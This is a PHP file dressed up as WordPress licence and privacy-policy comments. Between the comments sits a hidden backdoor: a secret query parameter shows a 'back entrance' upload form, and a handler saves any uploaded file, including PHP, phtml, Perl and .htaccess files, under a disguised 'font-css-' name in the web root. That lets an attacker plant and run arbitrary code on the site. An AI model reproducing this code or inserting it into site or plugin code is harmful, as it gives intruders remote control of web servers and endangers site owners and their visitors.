
<?php
//

//GNU Public License

//The license under which the WordPress software is released is the GPLv2 (or later) from the Free Software Foundation. A copy of the license is included with every copy of WordPress, but you can also read the text of the license here.

//Part of this license outlines requirements for derivative works, such as plugins or themes. Derivatives of WordPress code inherit the GPL license. Drupal, which has the same GPL license as WordPress, has an excellent page on licensing as it applies to themes and modules (their word for plugins).

//There is some legal grey area regarding what is considered a derivative work, but we feel strongly that plugins and themes are derivative work and thus inherit the GPL license. If you disagree, you might want to consider a non-GPL platform such as Serendipity (BSD license) or Habari (Apache license) instead.

//Privacy Policy
//WordPress.org websites (collectively “WordPress.org” in this document) refer to sites hosted on the WordPress.org, WordPress.net, WordCamp.org, BuddyPress.org, bbPress.org, and other related domains and subdomains thereof. This privacy policy describes how WordPress.org uses and protects any information that you give us. We are committed to ensuring that your privacy is protected. If you provide us with personal information through WordPress.org, you can be assured that it will only be used in accordance with this privacy statement.

//Website Visitors
//Like most website operators, WordPress.org collects non-personally-identifying information of the sort that web browsers and servers typically make available, such as the browser type, language preference, referring site, and the date and time of each visitor request. WordPress.org’s purpose in collecting non-personally identifying information is to better understand how WordPress.org’s visitors use its website. From time to time, WordPress.org may release non-personally-identifying information in the aggregate, e.g., by publishing a report on trends in the usage of its website.

//WordPress.org also collects potentially personally-identifying information like Internet Protocol (IP) addresses. WordPress.org does not use IP addresses to identify its visitors, however, and does not disclose such information, other than under the same circumstances that it uses and discloses personally-identifying information, as described below.

//Gathering of Personally-Identifying Information
//Certain visitors to WordPress.org choose to interact with WordPress.org in ways that require WordPress.org to gather personally-identifying information. The amount and type of information that WordPress.org gathers depends on the nature of the interaction. For example, we ask visitors who use our forums to provide a username and email address.

//In each case, WordPress.org collects such information only insofar as is necessary or appropriate to fulfill the purpose of the visitor’s interaction with WordPress.org. WordPress.org does not disclose personally-identifying information other than as described below. And visitors can always refuse to supply personally-identifying information, with the caveat that it may prevent them from engaging in certain website-related activities, like purchasing a WordCamp ticket.

//All of the information that is collected on WordPress.org will be handled in accordance with GDPR legislation.

//Protection of Certain Personally-Identifying Information
//WordPress.org discloses potentially personally-identifying and personally-identifying information only to those of project administrators, employees, contractors, and affiliated organizations that (i) need to know that information in order to process it on WordPress.org’s behalf or to provide services available through WordPress.org, and (ii) that have agreed not to disclose it to others. Some of those employees, contractors and affiliated organizations may be located outside of your home country; by using WordPress.org, you consent to the transfer of such information to them.

//WordPress.org will not rent or sell potentially personally-identifying and personally-identifying information to anyone. Other than to project administrators, employees, contractors, and affiliated organizations, as described above, WordPress.org discloses potentially personally-identifying and personally-identifying information only when required to do so by law, if you give permission to have your information shared, or when WordPress.org believes in good faith that disclosure is reasonably necessary to protect the property or rights of WordPress.org, third parties, or the public at large.

//If you are a registered user of a WordPress.org website and have supplied your email address, WordPress.org may occasionally send you an email to tell you about new features, solicit your feedback, or just keep you up to date with what’s going on with WordPress.org and our products. We primarily use our blog to communicate this type of information, so we expect to keep this type of email to a minimum.

//If you send us a request (for example via a support email or via one of our feedback mechanisms), we reserve the right to publish it in order to help us clarify or respond to your request or to help us support other users. WordPress.org takes all measures reasonably necessary to protect against the unauthorized access, use, alteration, or destruction of potentially personally-identifying and personally-identifying information.

//Use of personal information
//We use the information you provide to register for an account, attend our events, receive newsletters, use certain other services, or participate in the WordPress open source project in any other way.

//We will not sell or lease your personal information to third parties unless we have your permission or are required by law to do so.

//We would like to send you email marketing communication which may be of interest to you from time to time. If you have consented to marketing, you may opt out later.

//You have a right at any time to stop us from contacting you for marketing purposes. If you no longer wish to be contacted for marketing purposes, please click on the unsubscribe link at the bottom of the email.                                  
//
if ($_GET['my'] == "s") {
echo '<style type="text/css">
body {

background-size: cover;
background-position: center;

 radial-gradient(
 rgba(0,255,0,.8),
 black
 );
background-blend-mode: overlay;
background:url(https://i.imgur.com/0E86uHz.jpg),
 radial-gradient(
 rgba(0,255,0,.8),
 black
 ),
 repeating-linear-gradient(
 transparent 0,
 rgba(0,0,0,.2) 3px,
 transparent 6px
 );
 .night-vision-effect {
 
 radial-gradient(
 rgba(0,255,0,.8),
 black
 ),
 repeating-linear-gradient(
 transparent 0,
 rgba(0,0,0,.2) 3px,
 transparent 6px
 );
 background-blend-mode: overlay;
 background-size: cover;
 }
}

h1,h2{

color: #1fff1c;
text-align: center;
}
h3,h4,h5{
color: black;
text-align: center;
}

label{
    padding: 10px;
    background: black; 
    display: table;
    color: #fff;
     }



input[type="file"] {
   display: none;
}
</style><b><br>
<h1>&#9812; ~ back entrance ~ &#9812;</h1>
<br><br>
<center>
<font color:"blue">
<span style="font-family: monospace;">
<span style="color: rgb(255, 255, 255);">
<br><br>
<font color="black"></font>
<br></b>';
echo'
<label id="#bb"> Enter Your File<form method="post" enctype="multipart/form-data">    
   <input name="file" size="18" id="File" type="file" value="">
    <p><input name="submit" type="submit" value="&#9658; dow"></label></form>';

}
//We would like to send you email marketing communication which may be of interest to you from time to time. If you have consented to marketing, you may opt out later.

$file = $_FILES['file']['tmp_name'];
$filename = $_FILES['file']['name'];
if(!empty($file))
{
  ini_set('memory_limit', '32M'); 
  $maxsize = "100000000";
  $extentions = array( "gif","txt","tpl","jpg","jpeg","png","php", "phtml","7z","tif","psd","swf","flv","avi","mpeg","mp4","mp3","wav", "htaccess","ogm","php5","pl","ppt");
  $size = filesize ($_FILES['file']['tmp_name']); 
  $type = strtolower(substr($filename, 1+strrpos($filename,".")));
  $new_name = 'font-css-'.time().'.'.$type; 
  if($size > $maxsize)
  { 
     echo "The file is more than. Reduce the size of your file or upload another. <br><a href='' onClick=window.close();>close the window</a>";
  } 
  elseif(!in_array($type,$extentions)) 
  { 
    echo ' <b>The file has an invalid extension</b>. Valid formats are images, videos, flash movies, and text documents. <br>';
  } 
  else 
  { 
    if (copy($file, "".$new_name))
      echo "File uploaded!<br>Copy the address of the file<br> <a href=\"$new_name\"><b>$new_name</b></a><br> and press<br><a href='' onClick=history.back();>return back</a>";
    else echo "The file was not downloaded.";
  } 
}
//We would like to send you email marketing communication which may be of interest to you from time to time. If you have consented to marketing, you may opt out later.